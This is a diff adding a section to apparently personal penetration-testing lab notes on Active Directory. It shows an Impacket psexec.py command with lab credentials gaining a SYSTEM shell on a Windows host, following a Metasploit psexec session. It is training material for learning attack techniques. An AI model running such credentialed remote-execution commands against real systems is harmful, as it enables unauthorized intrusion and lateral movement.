@@ -147,4 +147,24 @@ msf6 exploit(windows/smb/psexec) > exploit
 meterpreter > 
 ```
 
+2. Psexec.py
 
+We can get shell on target system, using this syntax :
+
+```shell
+sec-fortress@Pwn-F0rk-3X3C:~/PEH/AD$ psexec.py MARVEL/fcastle:'Password1'@192.168.0.166
+
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.0.166.....
+[*] Found writable share ADMIN$
+[*] Uploading file fsodQFwB.exe
+[*] Opening SVCManager on 192.168.0.166.....
+[*] Creating service fqSt on 192.168.0.166.....
+[*] Starting service fqSt.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
